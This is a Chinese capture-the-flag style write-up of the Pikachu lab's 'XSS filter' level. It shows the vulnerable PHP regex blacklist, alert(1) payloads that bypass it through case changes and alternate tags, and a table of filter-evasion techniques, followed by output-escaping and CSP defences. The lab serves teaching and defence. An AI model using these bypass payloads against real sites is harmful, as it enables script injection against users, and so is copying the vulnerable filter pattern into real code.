# XSS 之过滤 通关笔记
> 这关开始教"绕过"了。
>
> 网站用正则删掉了 `<script`，看起来堵住了。但**黑名单这条路，从设计上就走不通**。
---
## 一、环境与目标
| 项目 | 内容 |
| --- | --- |
| 靶场 | Pikachu |
| 关卡位置 | Cross-Site Scripting → xss之过滤 |
| 页面地址 | `http://pikachu/vul/xss/xss_01.php` |
| 页面形式 | 输入框，问「阁下,请问你觉得人生苦短吗?」 |
| 目标 | 绕过过滤，让页面弹窗 |
---
## 二、我的解题步骤
### 步骤 1：先提交标准 payload，看看发生了什么
输入：
```html
<script>alert(1)</script>
```
提交后页面显示：
```
别说这些''的话,不要怕,就是干!
```
**中间的 payload 不见了**——被过滤掉了。
### 步骤 2：看源码，搞清楚它过滤了什么
```php
$message=preg_replace('/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/', '', $_GET['message']);
```
这行正则的意思是：
> 匹配**以 `<` 开头**、后面**按顺序**出现 `s`、`c`、`r`、`i`、`p`、`t` 的内容，替换为空。
也就是：**它想把 `<script` 删掉。**
### 步骤 3：注意到正则没有 `i` 标志
```php
preg_replace('/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/', ...)
//            ↑ 末尾没有 i，所以区分大小写
```
**大写 `S` 不匹配小写 `s`。**
### 步骤 4：大小写绕过
提交：
```html
<Script>alert(1)</Script>
```
页面显示：
```html
<p>别说这些'<Script>alert(1)</Script>'的话,不要怕,就是干!</p>
```
**原样通过，弹窗了。**
### 步骤 5：再试一种——换个标签
```html
<img src=x onerror=alert(1)>
```
页面显示：
```html
<p>别说这些'<img src=x onerror=alert(1)>'的话,不要怕,就是干!</p>
```
**同样通过。**
因为正则只针对 `script` 这个词，`img` 完全不受影响。
---
## 三、原理分析
### 3.1 完整源码
```php
$html = '';
if(isset($_GET['submit']) && $_GET['message'] != null){
    //这里会使用正则对<script进行替换为空,也就是过滤掉
    $message=preg_replace('/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/', '', $_GET['message']);
    if($message == 'yes'){
        $html.="<p>那就去人民广场一个人坐一会儿吧!</p>";
    }else{
        $html.="<p>别说这些'{$message}'的话,不要怕,就是干!</p>";
    }
}
```
### 3.2 这个正则为什么挡不住
| 问题 | 说明 |
| --- | --- |
| **没有 `i` 标志** | `Script`、`SCRIPT` 都能过 |
| **只针对 `script` 一个词** | `img`、`svg`、`body` 都不管 |
| **只删不转义** | 删除是有损的，改一下就绕开 |
| **`.*` 是贪婪匹配** | 可能误删正常内容，但不增加安全性 |
### 3.3 我验证过的真实输出
**提交 `<Script>alert(1)</Script>`：**
```html
<p>别说这些'<Script>alert(1)</Script>'的话,不要怕,就是干!</p>
```
**提交 `<img src=x onerror=alert(1)>`：**
```html
<p>别说这些'<img src=x onerror=alert(1)>'的话,不要怕,就是干!</p>
```
两个都**原样通过**，没有任何过滤。
---
## 四、知识点与笔记
### 4.1 黑名单的五种绕过思路
| 思路 | 例子 |
| --- | --- |
| **大小写** | `<Script>`、`<ScRiPt>` |
| **换标签** | `<img src=x onerror=alert(1)>`、`<svg onload=alert(1)>` |
| **嵌套** | `<scr<script>ipt>alert(1)</scr</script>ipt>` |
| **编码** | HTML 实体、URL 编码、Unicode |
| **畸形** | `<img/src=x/onerror=alert(1)>`（用 `/` 代替空格） |
### 4.2 为什么黑名单注定失败
因为：
> **你要列举"所有坏的东西"，但"好的东西"的组合是无限的。**
攻击者只需要找到一个你没列出的写法。
而白名单（只允许已知安全的）逻辑正好相反，天然更安全。
### 4.3 正确方向：转义，而不是删除
```php
// 错误：删除
$message = preg_replace('/<script/', '', $input);
// 正确：转义
$message = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
```
转义之后：
```
<script>alert(1)</script>
        ↓
&lt;script&gt;alert(1)&lt;/script&gt;
```
浏览器只会把它当**文字**显示。
**关键区别：删除会改变内容，转义不会。用户看到的还是他输入的东西，只是不会执行。**
### 4.4 富文本场景怎么办
如果业务确实需要允许 HTML（比如富文本编辑器），用**白名单**：
```php
$allowed = '<b><i><u><p><br><a>';
echo strip_tags($input, $allowed);
```
但即使这样也不够——还要处理：
- `<a href="javascript:...">`（属性里的协议）
- `onclick` 这类事件属性
**所以富文本过滤要用成熟的库**（如 HTMLPurifier），不要自己写。
---
## 五、和前面几关的区别
| 关卡 | 有没有防护 | 绕过方式 |
| --- | --- | --- |
| 反射型 GET | 无 | 直接打 |
| 存储型 | 无（只做了 SQL 转义） | 直接打 |
| **xss之过滤** | **有正则黑名单** | **大小写 / 换标签** |
**从这关开始，题目从"能不能注入"变成了"被拦了怎么绕"。**
---
## 六、防御怎么写
### 6.1 不要用黑名单
```php
// 全部错误
preg_replace('/<script/', '', $input);
str_replace('<script>', '', $input);
preg_match('/onerror/', $input);
```
### 6.2 用输出转义
```php
$message = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
echo "<p>别说这些'{$message}'的话</p>";
```
### 6.3 三层配合
| 层 | 做法 |
| --- | --- |
| 输出编码 | `htmlspecialchars()` |
| CSP | 禁止内联脚本 |
| Cookie | `HttpOnly` |
---
## 七、总结
| 要点 | 内容 |
| --- | --- |
| 这关教什么 | 黑名单过滤可以被绕过 |
| 绕过方式 | 大小写 `<Script>`、换标签 `<img>` |
| 根本原因 | 黑名单只能列举已知的坏东西 |
| 正确方向 | 输出转义 |
**一句话**：
> **过滤是在"堵漏"，转义是在"改材质"。堵漏永远堵不完，改材质一次解决。**
---
## 参考
- [OWASP: XSS Filter Evasion](https://owasp.org/www-community/attacks/xss/)
- [OWASP: XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Pikachu 源码](https://github.com/zhuifengshaonianhanlu/pikachu)
